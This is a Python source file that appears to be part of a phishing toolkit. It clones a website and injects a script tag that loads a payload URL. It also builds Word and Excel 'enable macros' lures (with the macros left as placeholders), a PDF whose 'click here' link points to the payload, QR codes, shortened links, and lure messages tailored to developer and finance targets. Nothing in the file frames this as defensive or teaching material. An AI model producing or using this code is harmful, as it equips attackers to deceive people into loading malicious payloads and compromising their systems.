import requests
from bs4 import BeautifulSoup
import logging
import os
from docx import Document

def clone_website(url, payload_url):
    """
    Clones a website and injects a script tag to serve a payload.
    """
    logging.info(f"Cloning website: {url}")
    try:
        response = requests.get(url)
        if response.status_code != 200:
            logging.error(f"Failed to clone website. Status code: {response.status_code}")
            return None

        soup = BeautifulSoup(response.text, 'html.parser')

        script_tag = soup.new_tag("script", src=payload_url)
        if soup.head:
            soup.head.insert(0, script_tag)
        else:
            head = soup.new_tag("head")
            soup.html.insert(0, head)
            soup.head.append(script_tag)

        output_dir = "cloned_site"
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        cloned_html_path = os.path.join(output_dir, "index.html")
        with open(cloned_html_path, "w", encoding="utf-8") as f:
            f.write(str(soup))

        logging.info(f"Website cloned successfully. Modified HTML saved to {cloned_html_path}")
        return output_dir

    except Exception as e:
        logging.error(f"An error occurred while cloning the website: {e}")
        return None

def create_macro_doc(output_path, payload_command):
    """
    Creates a Word document with a placeholder for a malicious macro.
    """
    logging.info(f"Creating infectious Word document at {output_path}...")

    document = Document()
    document.add_heading('Confidential Report', 0)
    p = document.add_paragraph('This document contains sensitive information. ')
    p.add_run('Please enable macros').bold = True
    p.add_run(' to view the full content.')

    document.save(output_path)
    logging.info(f"Word document saved to {output_path}.")
    logging.warning("Macro functionality is not implemented. This is a placeholder.")
    return output_path, None

from fpdf import FPDF
from openpyxl import Workbook

def create_pdf_lure(output_path, payload_url):
    """
    Creates a PDF with a clickable link to a payload.
    """
    logging.info(f"Creating PDF lure at {output_path}...")
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="This document is protected.", ln=1, align="C")
    pdf.cell(200, 10, txt="Please click here to view the full document.", ln=2, align="C", link=payload_url)
    pdf.output(output_path)
    logging.info(f"PDF lure created at {output_path}")
    return output_path

def create_excel_lure(output_path, payload_command):
    """
    Creates an Excel file with a macro placeholder.
    """
    logging.info(f"Creating Excel lure at {output_path}...")
    wb = Workbook()
    ws = wb.active
    ws['A1'] = "Please enable macros to view this content."
    # Similar to Word, python libraries cannot directly create .xlsm files with macros.
    # This serves as a placeholder.
    wb.save(output_path)
    logging.warning("Excel lure created, but macro must be added manually.")
    return output_path

import qrcode
import pyshorteners

def generate_qr_code(data, output_path):
    """
    Generates a QR code from a given data string.
    """
    logging.info(f"Generating QR code at {output_path}...")
    img = qrcode.make(data)
    img.save(output_path)
    logging.info(f"QR code saved to {output_path}")
    return output_path

def shorten_url(url):
    """
    Shortens a URL using the TinyURL service.
    """
    logging.info(f"Shortening URL: {url}...")
    s = pyshorteners.Shortener()
    try:
        short_url = s.tinyurl.short(url)
        logging.info(f"Shortened URL: {short_url}")
        return short_url
    except Exception as e:
        logging.error(f"Failed to shorten URL: {e}")
        return None

def generate_ai_lure_text(target_profile):
    """
    Simulates using an AI to generate convincing lure text based on a target's profile.
    """
    logging.info(f"Generating AI lure text for target profile: {target_profile}")

    # This is a placeholder for a more complex AI integration.
    # In a real scenario, this would involve calling a language model API.
    if target_profile == "developer":
        return "Hey, I saw your post about the new framework. I've made some improvements to the script, check out the attached file."
    elif target_profile == "finance":
        return "Here are the Q3 financial projections you requested. Please review them at your earliest convenience."
    else:
        return "Please find the attached document for your review."